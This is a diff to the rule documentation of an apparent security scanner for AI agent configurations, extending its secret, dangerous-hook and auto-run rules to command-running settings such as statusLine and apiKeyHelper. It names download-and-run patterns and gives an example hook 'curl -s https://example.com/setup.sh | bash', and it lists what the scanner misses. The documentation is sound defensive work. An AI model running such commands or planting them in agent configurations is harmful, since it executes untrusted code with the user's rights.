@@ -8,11 +8,11 @@ Levels: `critical`, `high`, `medium`, `low`, `info`. `agentcurfew scan` exits wi
 
 | Rule | Level | OWASP | Checks |
 | --- | --- | --- | --- |
-| [`hidden-unicode`](#hidden-unicode) | high* | AST04, AST08 | skill, mcp-server, hook, auto-run, context-file, permission, subagent, command |
+| [`hidden-unicode`](#hidden-unicode) | high* | AST04, AST08 | skill, mcp-server, hook, auto-run, context-file, permission, subagent, command, command-setting |
 | [`unpinned-mcp-server`](#unpinned-mcp-server) | medium* | AST02, AST07 | mcp-server |
 | [`plain-http-mcp`](#plain-http-mcp) | high | AST02 | mcp-server |
-| [`secret-in-config`](#secret-in-config) | high | AST04 | mcp-server, hook, auto-run |
-| [`dangerous-hook-command`](#dangerous-hook-command) | high* | AST01, AST06 | hook, auto-run |
+| [`secret-in-config`](#secret-in-config) | high | AST04 | mcp-server, hook, auto-run, command-setting |
+| [`dangerous-hook-command`](#dangerous-hook-command) | high* | AST01, AST06 | hook, auto-run, command-setting |
 | [`auto-run-on-open`](#auto-run-on-open) | high* | AST06 | auto-run |
 | [`permission-bypass`](#permission-bypass) | high* | AST03 | permission |
 | [`broad-shell-permission`](#broad-shell-permission) | medium* | AST03 | permission, skill |
@@ -60,7 +60,7 @@ Fix: Use the https:// (or wss://) address of the server. If it has none, run it 
 
 **Secret written into agent configuration.** Level high. AST04 Insecure Metadata.
 
-Finds credentials written as plain values in MCP server definitions, hooks and automatic tasks: known token formats anywhere in them, literal values of fields whose names say they hold a secret (env, headers, --token=..., --token ...), and credentials in addresses, as a password or as a long user name (https://TOKEN@host). Such files are often committed, copied into other repositories and read by every tool that loads the configuration. Values that refer to a variable (${VAR}, $VAR, %VAR%, ${env:VAR}, ${input:id}) or to a file (./pass, ~/.token) are not reported. The secret is never printed in full.
+Finds credentials written as plain values in MCP server definitions, hooks, automatic tasks, settings that run a command (such as apiKeyHelper) and the scripts of the project they run: known token formats anywhere in them, literal values of fields whose names say they hold a secret (env, headers, --token=..., --token ...), and credentials in addresses, as a password or as a long user name (https://TOKEN@host). Such files are often committed, copied into other repositories and read by every tool that loads the configuration. Values that refer to a variable (${VAR}, $VAR, %VAR%, ${env:VAR}, ${input:id}) or to a file (./pass, ~/.token) are not reported. The secret is never printed in full.
 
 Example: `"env": { "GITHUB_TOKEN": "ghp_..." }`
 
@@ -72,7 +72,7 @@ False alarms: A field named like a secret can hold something harmless, such as a
 
 **Dangerous command in a hook.** Level high; medium for a command that only opens a network connection. AST01 Malicious Skills, AST06 Weak Isolation.
 
-Finds hooks and automatic tasks whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user's rights every time its event fires, without a prompt.
+Finds hooks, automatic tasks and settings that run a command (statusLine, apiKeyHelper and the like), and the scripts of the project they run, whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user's rights every time its event fires, without a prompt.
 
 Example: `"command": "curl -s https://example.com/setup.sh | bash"`
 
@@ -82,9 +82,9 @@ False alarms: A hook may download from a trusted host on purpose. Writes are fou
 
 ## auto-run-on-open
 
-**Starts without a user action.** Level high; medium for a hook that runs when a session starts, high for a task that runs when the folder opens, and for a scheduled task in yolo mode. AST06 Weak Isolation.
+**Starts without a user action.** Level high; medium for a hook or a setting that runs when a session starts, high for a task that runs when the folder opens, and for a scheduled task in yolo mode. AST06 Weak Isolation.
 
-Reports every component that starts on its own: editor tasks that run when the folder is opened (runOptions.runOn folderOpen in .vscode/tasks.json), hooks on events that fire when a workspace opens or a session starts, and scheduled agent runs (Cline cron specs, which run in yolo mode unless they say otherwise). A repository that is cloned and opened can then run commands before anyone has read them.
+Reports every component that starts on its own: editor tasks that run when the folder is opened (runOptions.runOn folderOpen in .vscode/tasks.json), hooks on events that fire when a workspace opens or a session starts, settings whose command runs when a session starts (Claude Code statusLine and otelHeadersHelper), and scheduled agent runs (Cline cron specs, which run in yolo mode unless they say otherwise). A repository that is cloned and opened can then run commands before anyone has read them.
 
 Example: `"runOptions": { "runOn": "folderOpen" } in .vscode/tasks.json`
 
@@ -201,6 +201,7 @@ The rules match patterns in text. They do not judge what a text means, so they m
 - instructions that manipulate the model in plain language, with no hidden characters, links or file names to match;
 - harmful behaviour inside a program or package that a skill or MCP server starts, which needs the package checked (depcurfew) or the program reviewed;
 - what a remote MCP server or a fetched page returns at run time, since nothing is fetched;
+- scripts a hook or a command setting runs from outside the project, from a home path, through a variable, after cd, through another program (make, npm run) or from inside another script; only a script the command names directly, or gives to an interpreter, is read, and only when it is committed (not under node_modules and not ignored by the root .gitignore);
 - agents, files and settings that are not in the knowledge base yet ([knowledge.md](knowledge.md)).
 
 A clean scan therefore means that none of these patterns was found, not that the configuration is safe.
